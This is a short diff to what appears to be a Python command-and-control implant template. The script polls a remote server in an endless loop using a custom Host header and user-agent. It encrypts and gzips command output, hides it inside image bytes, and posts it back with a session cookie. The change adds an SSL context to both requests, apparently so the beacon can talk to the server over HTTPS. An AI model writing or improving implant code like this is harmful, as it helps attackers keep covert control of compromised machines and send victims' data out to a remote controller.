@@ -102,7 +102,7 @@ while(True):
       ua='%s'
       if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
       else: req=urllib2.Request(server,headers={'User-agent':ua})
-      res=urllib2.urlopen(req)
+      res=urllib2.urlopen(req,context=ctx)
       html = res.read()
     except Exception as e:
       E = e
@@ -220,7 +220,7 @@ while(True):
             dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
             if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
             else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            res=urllib2.urlopen(req)
+            res=urllib2.urlopen(req,context=ctx)
             response = res.read()
 
       except Exception as e:
